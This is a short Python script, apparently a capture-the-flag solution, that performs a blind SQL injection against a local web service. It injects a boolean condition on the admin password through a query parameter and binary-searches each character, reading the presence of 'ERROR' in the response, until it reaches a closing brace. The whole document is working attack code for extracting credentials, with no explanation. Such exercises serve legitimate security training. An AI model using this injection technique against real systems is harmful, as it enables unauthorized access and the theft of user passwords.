import requests

url = "http://127.0.0.1:30030"

res = ""
while True:
    s = 0
    e = 255
    while(s<=e):
        mid = (s+e)//2
        
        payload = f"' or username='admin' and password>='{res+chr(mid)}"
        
        response = requests.get(url=url, params={"password":payload})
        if "ERROR" in response.text:
            e = mid-1
        else: 
            s = mid+1
            
    if "ERROR" in response.text:
        mid -= 1
    res += chr(mid)
    
    if chr(mid) == "}":
        break
    print(res)
print(res)